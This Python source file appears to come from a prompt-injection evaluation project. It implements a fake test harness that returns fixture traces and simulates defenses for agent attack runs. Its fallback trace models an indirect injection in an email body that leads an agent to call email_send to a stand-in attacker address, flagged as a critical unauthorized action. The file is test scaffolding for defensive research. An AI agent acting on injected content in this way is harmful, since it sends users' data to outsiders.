"""
engine/harness/fake.py
FakeHarness implementation for Hour 1.0 unblocking.
Implements the Harness Protocol using local fixtures.
Allows Person B (Olin) and Person C (Pierson) to develop and test without live LLMs or sandboxes.
"""

import json
from pathlib import Path
from typing import Any
import uuid

from contracts.enums import AttackType, ReplayMode, RunMode, Severity, Verdict
from contracts.interfaces import Harness
from contracts.schemas import AttackOutcome, AttackTrace, TraceStep


class FakeHarness:
    """Fake harness returning fixture traces and simulating attacks/defenses."""

    def __init__(self, fixtures_dir: Path | str | None = None):
        if fixtures_dir is None:
            # Default to repo root / fixtures / traces
            self.fixtures_dir = Path(__file__).resolve().parent.parent.parent / "fixtures" / "traces"
        else:
            self.fixtures_dir = Path(fixtures_dir)
        self.active_defense_id: str | None = None

    def set_defense(self, defense_id: str | None) -> None:
        """Sets or clears the active defense."""
        self.active_defense_id = defense_id

    def _load_default_fixture(self) -> AttackTrace:
        """Loads the first available trace fixture, or constructs a fallback."""
        if self.fixtures_dir.exists():
            fixtures = list(self.fixtures_dir.glob("*.json"))
            if fixtures:
                with open(fixtures[0], "r", encoding="utf-8") as f:
                    data = json.load(f)
                    return AttackTrace.model_validate(data)

        # Fallback trace if no files found on disk
        return AttackTrace(
            trace_id=f"fake-{uuid.uuid4()}",
            created_at="2026-10-10T12:00:00Z",
            run_mode=RunMode.RECORDED,
            synthetic=True,
            attack_type=AttackType.INDIRECT_INJECTION,
            target_agent_id="agentdojo:workspace:task_0",
            attack_variant_id="fake_variant_0",
            injection_payload={"location": "email_body", "content": "Fake injection content"},
            steps=[
                TraceStep(
                    step_index=0,
                    step_type="llm_call",
                    timestamp="2026-10-10T12:00:01Z",
                    content="Summarizing email",
                    partial_score=0.25,
                ),
                TraceStep(
                    step_index=1,
                    step_type="tool_call",
                    timestamp="2026-10-10T12:00:02Z",
                    content="Calling tool email_send",
                    tool_name="email_send",
                    tool_args={"to": "attacker@evil.corp"},
                    is_flagged=True,
                    flag_reason="Unauthorized recipient",
                    partial_score=1.0,
                ),
            ],
            outcome=AttackOutcome(
                succeeded=True,
                detection_method="deterministic",
                severity=Severity.CRITICAL,
                unauthorized_actions=["email_send"],
                partial_score=1.0,
            ),
            seed=42,
        )

    def run_attack(self, task_id: str, injection: dict[str, Any], seed: int = 42) -> AttackTrace:
        """Runs a simulated attack."""
        trace = self._load_default_fixture()
        trace.trace_id = f"trace-{uuid.uuid4()}"
        trace.target_agent_id = task_id
        trace.injection_payload = injection
        trace.seed = seed

        # If a defense is active, simulate defense blocking behavior
        if self.active_defense_id is not None:
            trace.outcome.succeeded = False
            trace.outcome.severity = Severity.LOW
            trace.outcome.unauthorized_actions = []
            trace.outcome.partial_score = 0.25

        return trace

    def run_benign(self, task_id: str, seed: int = 42) -> AttackTrace:
        """Runs a simulated benign task."""
        trace = self._load_default_fixture()
        trace.trace_id = f"trace-benign-{uuid.uuid4()}"
        trace.target_agent_id = task_id
        trace.injection_payload = {}
        trace.seed = seed
        trace.outcome.succeeded = False
        trace.outcome.unauthorized_actions = []
        trace.outcome.partial_score = 0.0
        return trace

    def replay(self, trace: AttackTrace, mode: ReplayMode, k: int = 5) -> list[AttackTrace]:
        """
        Replays a trace.
        - CASSETTE: Exact reproduction of original trace (1 trace, <3s).
        - LIVE: Returns k trials (simulating stochastic runs, influenced by active defense).
        """
        if mode == ReplayMode.CASSETTE:
            replayed = trace.model_copy(deep=True)
            replayed.trace_id = f"replay-cassette-{uuid.uuid4()}"
            replayed.run_mode = RunMode.RECORDED
            return [replayed]

        # LIVE k-trial replay
        results: list[AttackTrace] = []
        for i in range(k):
            replayed = trace.model_copy(deep=True)
            replayed.trace_id = f"replay-live-{uuid.uuid4()}-{i}"
            replayed.run_mode = RunMode.LIVE

            # If defense is active, simulate blocking
            if self.active_defense_id is not None:
                replayed.outcome.succeeded = False
                replayed.outcome.partial_score = 0.25
                replayed.outcome.unauthorized_actions = []

            results.append(replayed)

        return results
